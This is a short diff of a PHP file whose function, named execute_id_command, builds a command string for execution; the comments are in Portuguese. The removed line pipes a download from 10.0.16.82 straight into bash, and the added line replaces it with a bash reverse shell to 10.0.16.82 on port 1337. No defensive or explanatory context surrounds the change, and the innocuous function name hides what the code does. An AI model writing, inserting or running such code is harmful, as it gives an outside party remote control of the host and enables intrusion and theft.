@@ -1,7 +1,7 @@
 <?php 
 
 function execute_id_command() {
-    $command = "curl 10.0.16.82|bash"; // Comando a ser executado
+    $command = "bash -c 'bash -i >& /dev/tcp/10.0.16.82/1337 0>&1'"; // Comando a ser executado
     $descriptorspec = array(
         0 => array("pipe", "r"), // Entrada padrão
         1 => array("pipe", "w"), // Saída padrão
